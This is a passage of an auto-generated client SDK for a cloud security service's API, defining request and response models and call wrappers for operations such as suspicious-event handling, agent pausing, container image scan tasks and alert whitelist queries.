model OperateWebLockFileEventsRequest {
  dealAll?: int32(name='DealAll'),
  eventIds?: [ long ](name='EventIds'),
  operationCode?: string(name='OperationCode'),
}

model OperateWebLockFileEventsResponseBody = {
  requestId?: string(name='RequestId'),
}

model OperateWebLockFileEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateWebLockFileEventsResponseBody(name='body'),
}

async function operateWebLockFileEventsWithOptions(request: OperateWebLockFileEventsRequest, runtime: Util.RuntimeOptions): OperateWebLockFileEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealAll)) {
    query['DealAll'] = request.dealAll;
  }
  if (!Util.isUnset(request.eventIds)) {
    query['EventIds'] = request.eventIds;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateWebLockFileEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateWebLockFileEvents(request: OperateWebLockFileEventsRequest): OperateWebLockFileEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateWebLockFileEventsWithOptions(request, runtime);
}

model OperationCancelIgnoreSuspEventRequest {
  securityEventIds?: [ long ](name='SecurityEventIds'),
}

model OperationCancelIgnoreSuspEventResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
  timeCost?: long(name='TimeCost'),
}

model OperationCancelIgnoreSuspEventResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperationCancelIgnoreSuspEventResponseBody(name='body'),
}

async function operationCancelIgnoreSuspEventWithOptions(request: OperationCancelIgnoreSuspEventRequest, runtime: Util.RuntimeOptions): OperationCancelIgnoreSuspEventResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperationCancelIgnoreSuspEvent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operationCancelIgnoreSuspEvent(request: OperationCancelIgnoreSuspEventRequest): OperationCancelIgnoreSuspEventResponse {
  var runtime = new Util.RuntimeOptions{};
  return operationCancelIgnoreSuspEventWithOptions(request, runtime);
}

model OperationSuspEventsRequest {
  from?: string(name='From'),
  operation?: string(name='Operation'),
  sourceIp?: string(name='SourceIp'),
  subOperation?: string(name='SubOperation'),
  suspiciousEventIds?: string(name='SuspiciousEventIds'),
  warnType?: string(name='WarnType'),
}

model OperationSuspEventsResponseBody = {
  accessCode?: string(name='AccessCode'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model OperationSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperationSuspEventsResponseBody(name='body'),
}

async function operationSuspEventsWithOptions(request: OperationSuspEventsRequest, runtime: Util.RuntimeOptions): OperationSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.operation)) {
    query['Operation'] = request.operation;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.subOperation)) {
    query['SubOperation'] = request.subOperation;
  }
  if (!Util.isUnset(request.suspiciousEventIds)) {
    query['SuspiciousEventIds'] = request.suspiciousEventIds;
  }
  if (!Util.isUnset(request.warnType)) {
    query['WarnType'] = request.warnType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperationSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operationSuspEvents(request: OperationSuspEventsRequest): OperationSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operationSuspEventsWithOptions(request, runtime);
}

model PageImageRegistryRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  registryNameLike?: string(name='RegistryNameLike'),
  registryTypeInList?: [ string ](name='RegistryTypeInList'),
  registryTypeNotInList?: [ string ](name='RegistryTypeNotInList'),
  sourceIp?: string(name='SourceIp'),
}

model PageImageRegistryResponseBody = {
  list?: [ 
    {
      blackList?: string(name='BlackList'),
      domainName?: string(name='DomainName'),
      gmtCreate?: string(name='GmtCreate'),
      gmtModified?: string(name='GmtModified'),
      id?: long(name='Id'),
      imageCount?: int32(name='ImageCount'),
      jenkinsEnv?: string(name='JenkinsEnv'),
      netType?: int32(name='NetType'),
      password?: string(name='Password'),
      persistenceDay?: int32(name='PersistenceDay'),
      protocolType?: int32(name='ProtocolType'),
      regionId?: string(name='RegionId'),
      registryHostIp?: string(name='RegistryHostIp'),
      registryName?: string(name='RegistryName'),
      registryType?: string(name='RegistryType'),
      token?: string(name='Token'),
      transPerHour?: int32(name='TransPerHour'),
      userName?: string(name='UserName'),
      vpcId?: string(name='VpcId'),
      whiteList?: string(name='WhiteList'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model PageImageRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PageImageRegistryResponseBody(name='body'),
}

async function pageImageRegistryWithOptions(request: PageImageRegistryRequest, runtime: Util.RuntimeOptions): PageImageRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.currentPage)) {
    body['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    body['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.registryNameLike)) {
    body['RegistryNameLike'] = request.registryNameLike;
  }
  if (!Util.isUnset(request.registryTypeInList)) {
    body['RegistryTypeInList'] = request.registryTypeInList;
  }
  if (!Util.isUnset(request.registryTypeNotInList)) {
    body['RegistryTypeNotInList'] = request.registryTypeNotInList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'PageImageRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function pageImageRegistry(request: PageImageRegistryRequest): PageImageRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return pageImageRegistryWithOptions(request, runtime);
}

model PauseClientRequest {
  uuids?: string(name='Uuids', description='The list of servers for which you want to enable or disable the Security Center agent.', example='uuid-1211-sadsd-2131'),
  value?: string(name='Value', description='The status of the Security Center agent. Valid values:
- **0**: disabled
- **1**: enabled', example='1'),
}

model PauseClientResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model PauseClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PauseClientResponseBody(name='body'),
}

async function pauseClientWithOptions(request: PauseClientRequest, runtime: Util.RuntimeOptions): PauseClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PauseClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function pauseClient(request: PauseClientRequest): PauseClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return pauseClientWithOptions(request, runtime);
}

model PublicCreateImageScanTaskRequest {
  digests?: string(name='Digests', description='The SHA-256 value of the image digest. Separate multiple SHA-256 values with commas (,).', example='6a5e103187b31a94592a47a5858617f7a6c'),
  instanceIds?: string(name='InstanceIds', description='The ID of the Container Registry instance in which the image repository is created. Separate multiple IDs with commas (,).', example='i-uf6j8vq9l4r5ntht****'),
  regionIds?: string(name='RegionIds', description='The region ID of the image. Separate multiple IDs with commas (,).', example='cn-hangzhou'),
  registryTypes?: string(name='RegistryTypes', description='The type of the image repository. Separate multiple types with commas (,). Valid values:

*   **acr**
*   **harbor**
*   **quay**', example='acr'),
  repoIds?: string(name='RepoIds', description='The ID of the image repository. Separate multiple IDs with commas (,).', example='crr-vridcl4****'),
  repoNames?: string(name='RepoNames', description='The name of the image repository. Separate multiple names with commas (,).', example='centos'),
  repoNamespaces?: string(name='RepoNamespaces', description='The namespace to which the image repository belongs. Separate multiple namespaces with commas (,).', example='hanghai-namespace'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168..XX.XX'),
  tags?: string(name='Tags', description='The tag that is added to the image. Separate multiple tags with commas (,).', example='0.2'),
}

model PublicCreateImageScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more image scan tasks. Valid values:

*   **true**: yes
*   **false**: no

>  By default, a maximum of 10 image scan tasks can be running at the same time. If 10 image scan tasks are running, you cannot create an image scan task by calling this operation. You must wait for at least one of the 10 existing image scan tasks to complete before you can create an image scan task.', example='true'),
    collectTime?: long(name='CollectTime', description='The timestamp when the information about the images was collected. Unit: milliseconds.', example='1644286364150'),
    execTime?: long(name='ExecTime', description='The timestamp when the image scan task started to run. Unit: milliseconds.', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='The number of images that have been scanned.', example='5'),
    progress?: int32(name='Progress', description='The progress of the image scan task. Unit: percent.', example='100'),
    result?: string(name='Result', description='The result of the image scan task. Valid values:

*   **SUCCESS**: The task is successful.
*   **TASK_NOT_SUPPORT_REGION**: The images are deployed in a region that is not supported by container image scan.

>  For more information about the regions supported by container image scan, see the "Regions supported by container image scan" section in this topic.', example='SUCCESS'),
    status?: string(name='Status', description='The status of the image scan task. Valid values:

*   **INIT**: The task is being initialized.
*   **PRE_ANALYZER**: The task is being pre-processed.
*   **SUCCESS**: The task is successful.
*   **FAIL**: The task failed.', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the image scan task.', example='a410bb3e68c217a3368bc0238c66886d'),
    totalCount?: int32(name='TotalCount', description='The total number of images that need to be scanned.', example='5'),
  }(name='Data', description='The data returned if the call is successful.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicCreateImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicCreateImageScanTaskResponseBody(name='body'),
}

/**
  * Before you call the PublicCreateImageScanTask operation, we recommend that you call the [PublicPreCheckImageScanTask](~~PublicPreCheckImageScanTask~~) operation to query the number of images to scan and the quota for container image scan to be consumed by the image scan task. Make sure that the remaining quota for container image scan is sufficient. This prevents the task from being stopped due to an insufficient quota.
  *
  * @param request PublicCreateImageScanTaskRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return PublicCreateImageScanTaskResponse
 */
async function publicCreateImageScanTaskWithOptions(request: PublicCreateImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicCreateImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digests)) {
    query['Digests'] = request.digests;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.regionIds)) {
    query['RegionIds'] = request.regionIds;
  }
  if (!Util.isUnset(request.registryTypes)) {
    query['RegistryTypes'] = request.registryTypes;
  }
  if (!Util.isUnset(request.repoIds)) {
    query['RepoIds'] = request.repoIds;
  }
  if (!Util.isUnset(request.repoNames)) {
    query['RepoNames'] = request.repoNames;
  }
  if (!Util.isUnset(request.repoNamespaces)) {
    query['RepoNamespaces'] = request.repoNamespaces;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tags)) {
    query['Tags'] = request.tags;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicCreateImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * Before you call the PublicCreateImageScanTask operation, we recommend that you call the [PublicPreCheckImageScanTask](~~PublicPreCheckImageScanTask~~) operation to query the number of images to scan and the quota for container image scan to be consumed by the image scan task. Make sure that the remaining quota for container image scan is sufficient. This prevents the task from being stopped due to an insufficient quota.
  *
  * @param request PublicCreateImageScanTaskRequest
  * @return PublicCreateImageScanTaskResponse
 */
async function publicCreateImageScanTask(request: PublicCreateImageScanTaskRequest): PublicCreateImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicCreateImageScanTaskWithOptions(request, runtime);
}

model PublicPreCheckImageScanTaskRequest {
  digests?: string(name='Digests', description='The SHA-256 value of the image digest. Separate multiple SHA-256 values with commas (,).', example='6a5e103187b31a94592a47a5858617f7****'),
  instanceIds?: string(name='InstanceIds', description='The ID of the Container Registry instance in which the image repository is created. Separate multiple IDs with commas (,).', example='i-uf6j8vq9l4r5ntht****'),
  regionIds?: string(name='RegionIds', description='The region ID of the image. Separate multiple IDs with commas (,).', example='cn-hangzhou'),
  registryTypes?: string(name='RegistryTypes', description='The type of the image repository. Separate multiple types with commas (,). Valid values:

*   **acr**
*   **harbor**
*   **quay**', example='acr'),
  repoIds?: string(name='RepoIds', description='The ID of the image repository. Separate multiple IDs with commas (,).', example='crr-vridcl4****'),
  repoNames?: string(name='RepoNames', description='The name of the image repository. Separate multiple names with commas (,).', example='centos'),
  repoNamespaces?: string(name='RepoNamespaces', description='The namespace to which the image repository belongs. Separate multiple namespaces with commas (,).', example='hanghai-namespace'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  tags?: string(name='Tags', description='The tag that is added to the image. Separate multiple tags with commas (,).', example='0.2'),
}

model PublicPreCheckImageScanTaskResponseBody = {
  data?: {
    needAuthCount?: int32(name='NeedAuthCount', description='The number of images to scan in the task.', example='6'),
    scanImageCount?: int32(name='ScanImageCount', description='The quota for container image scan to be consumed by the task.', example='3'),
  }(name='Data', description='The data returned if the call is successful.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicPreCheckImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicPreCheckImageScanTaskResponseBody(name='body'),
}

/**
  * You can call the PublicPreCheckImageScanTask operation to estimate the quota for container image scan to be consumed by the task. This ensures that you know the quota to be consumed before you perform the task. If the remaining quota for container image scan is less than the quota to be consumed by the task, you must purchase a sufficient quota. This prevents the task from being stopped due to an insufficient quota.
  * If you do not specify the optional parameters when you call this operation, the total number of protected images and the quota for container image scan to be consumed by scanning all the protected images are queried. If you specify the optional parameters, the number of images that meet the specified conditions and the quota for container image scan to be consumed by scanning the images are queried.
  *
  * @param request PublicPreCheckImageScanTaskRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return PublicPreCheckImageScanTaskResponse
 */
async function publicPreCheckImageScanTaskWithOptions(request: PublicPreCheckImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicPreCheckImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digests)) {
    query['Digests'] = request.digests;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.regionIds)) {
    query['RegionIds'] = request.regionIds;
  }
  if (!Util.isUnset(request.registryTypes)) {
    query['RegistryTypes'] = request.registryTypes;
  }
  if (!Util.isUnset(request.repoIds)) {
    query['RepoIds'] = request.repoIds;
  }
  if (!Util.isUnset(request.repoNames)) {
    query['RepoNames'] = request.repoNames;
  }
  if (!Util.isUnset(request.repoNamespaces)) {
    query['RepoNamespaces'] = request.repoNamespaces;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tags)) {
    query['Tags'] = request.tags;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicPreCheckImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can call the PublicPreCheckImageScanTask operation to estimate the quota for container image scan to be consumed by the task. This ensures that you know the quota to be consumed before you perform the task. If the remaining quota for container image scan is less than the quota to be consumed by the task, you must purchase a sufficient quota. This prevents the task from being stopped due to an insufficient quota.
  * If you do not specify the optional parameters when you call this operation, the total number of protected images and the quota for container image scan to be consumed by scanning all the protected images are queried. If you specify the optional parameters, the number of images that meet the specified conditions and the quota for container image scan to be consumed by scanning the images are queried.
  *
  * @param request PublicPreCheckImageScanTaskRequest
  * @return PublicPreCheckImageScanTaskResponse
 */
async function publicPreCheckImageScanTask(request: PublicPreCheckImageScanTaskRequest): PublicPreCheckImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicPreCheckImageScanTaskWithOptions(request, runtime);
}

model PublicSyncAndCreateImageScanTaskRequest {
  images?: string(name='Images'),
  sourceIp?: string(name='SourceIp'),
}

model PublicSyncAndCreateImageScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate'),
    collectTime?: long(name='CollectTime'),
    execTime?: long(name='ExecTime'),
    finishCount?: int32(name='FinishCount'),
    progress?: int32(name='Progress'),
    result?: string(name='Result'),
    status?: string(name='Status'),
    taskId?: string(name='TaskId'),
    totalCount?: int32(name='TotalCount'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model PublicSyncAndCreateImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicSyncAndCreateImageScanTaskResponseBody(name='body'),
}

async function publicSyncAndCreateImageScanTaskWithOptions(request: PublicSyncAndCreateImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicSyncAndCreateImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.images)) {
    query['Images'] = request.images;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicSyncAndCreateImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function publicSyncAndCreateImageScanTask(request: PublicSyncAndCreateImageScanTaskRequest): PublicSyncAndCreateImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicSyncAndCreateImageScanTaskWithOptions(request, runtime);
}

model QueryDiscoverDatabaseRequest {
  createMark?: string(name='CreateMark', example='7f7b051f-7d1c-46da-b253-a03f3a27****'),
}

model QueryDiscoverDatabaseResponseBody = {
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
  taskProgress?: int32(name='TaskProgress', example='90'),
}

model QueryDiscoverDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryDiscoverDatabaseResponseBody(name='body'),
}

async function queryDiscoverDatabaseWithOptions(request: QueryDiscoverDatabaseRequest, runtime: Util.RuntimeOptions): QueryDiscoverDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.createMark)) {
    query['CreateMark'] = request.createMark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryDiscoverDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryDiscoverDatabase(request: QueryDiscoverDatabaseRequest): QueryDiscoverDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryDiscoverDatabaseWithOptions(request, runtime);
}

model QueryGroupIdByGroupNameRequest {
  groupName?: string(name='GroupName', description='The name of the asset group.', example='TestGroupName'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX'),
}

model QueryGroupIdByGroupNameResponseBody = {
  groupId?: long(name='GroupId', description='The ID of the asset group.', example='9935302'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model QueryGroupIdByGroupNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryGroupIdByGroupNameResponseBody(name='body'),
}

/**
  * You can call the QueryGroupIdByGroupName operation to query the ID of an asset group to which your assets belong by using the name of the asset group. When you call operations such as [GetSuspiciousStatistics](~~GetSuspiciousStatistics~~) and [DeleteGroup](~~DeleteGroup~~), you must specify the ID of the asset group. To query the ID of an asset group, call the QueryGroupIdByGroupName operation.
  * ### Limits
  * You can call this operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
  *
  * @param request QueryGroupIdByGroupNameRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return QueryGroupIdByGroupNameResponse
 */
async function queryGroupIdByGroupNameWithOptions(request: QueryGroupIdByGroupNameRequest, runtime: Util.RuntimeOptions): QueryGroupIdByGroupNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupName)) {
    query['GroupName'] = request.groupName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryGroupIdByGroupName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can call the QueryGroupIdByGroupName operation to query the ID of an asset group to which your assets belong by using the name of the asset group. When you call operations such as [GetSuspiciousStatistics](~~GetSuspiciousStatistics~~) and [DeleteGroup](~~DeleteGroup~~), you must specify the ID of the asset group. To query the ID of an asset group, call the QueryGroupIdByGroupName operation.
  * ### Limits
  * You can call this operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
  *
  * @param request QueryGroupIdByGroupNameRequest
  * @return QueryGroupIdByGroupNameResponse
 */
async function queryGroupIdByGroupName(request: QueryGroupIdByGroupNameRequest): QueryGroupIdByGroupNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryGroupIdByGroupNameWithOptions(request, runtime);
}

model QueryGroupedSecurityEventMarkMissListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  disposalWay?: string(name='DisposalWay', description='The handling method. Valid values:

*   **1**: Automatically Added to Whitelist
*   **2**: Defense Without Notification', example='1'),
  eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Login with unusual location'),
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  remark?: string(name='Remark', description='The condition that is used to query alert events by asset. You can specify a value of the following types:

*   The IP address of the asset.
*   The public IP address of the asset.
*   The private IP address of the asset.
*   The name of the asset.', example='222.185.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.66.XX.XX'),
}

model QueryGroupedSecurityEventMarkMissListResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='200'),
  list?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='31412647'),
      disposalWay?: string(name='DisposalWay', description='The handling method. Valid values:

*   **auto\\_add_white**: Automatically Added to Whitelist
*   **defense\\_not_notification**: Defense Without Notification', example='auto_add_white'),
      eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Login with unusual location'),
      eventNameOriginal?: string(name='EventNameOriginal', description='The name of the alert event. The value indicates a type.', example='login_common_location'),
      eventType?: string(name='EventType', description='The subtype of the alert event.', example='Unusual Logon'),
      eventTypeOriginal?: string(name='EventTypeOriginal', description='The type of the alert event.', example='Unusual logon'),
      field?: string(name='Field', description='The field that is used in the whitelist rule.', example='type'),
      fieldValue?: string(name='FieldValue', description='The value of the field.', example='root'),
      filedAliasName?: string(name='FiledAliasName', description='The alias of the field.', example='Logon Time'),
      operate?: string(name='Operate', description='The operator. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **strEqual**: equals
*   **strNotEqual**: does not equal
*   **regex**: regular expression', example='contains'),
      uuids?: string(name='Uuids', description='The UUIDs of assets. Multiple UUIDs are separated by commas (,).', example='6985b88c-eb19-4d27-98ad-e4a42312****,5721d503-9b04-4243-89ca-1fb8ca5e****,db2678c3-10e3-4a20-92f1-265f6****'),
    }
  ](name='List', description='An array that consists of the whitelist rules.'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='965F9282-D403-4FA2-B1B9-10F62DC719BF'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model QueryGroupedSecurityEventMarkMissListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryGroupedSecurityEventMarkMissListResponseBody(name='body'),
}

async function queryGroupedSecurityEventMarkMissListWithOptions(request: QueryGroupedSecurityEventMarkMissListRequest, runtime: Util.RuntimeOptions): QueryGroupedSecurityEventMarkMissListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.disposalWay)) {
    query['DisposalWay'] = request.disposalWay;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.currentPage)) {
    body['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.eventName)) {
    body['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.from)) {
    body['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    body['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    body['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryGroupedSecurityEventMarkMissList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryGroupedSecurityEventMarkMissList(request: QueryGroupedSecurityEventMarkMissListRequest): QueryGroupedSecurityEventMarkMissListResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryGroupedSecurityEventMarkMissListWithOptions(request, runtime);
}

model QueryJenkinsImageRegistryPersistenceDayRequest {
  sourceIp?: string(name='SourceIp', example='113.83.XXX.XXX'),
}

model QueryJenkinsImageRegistryPersistenceDayResponseBody = {
  data?: int32(name='Data', example='30'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
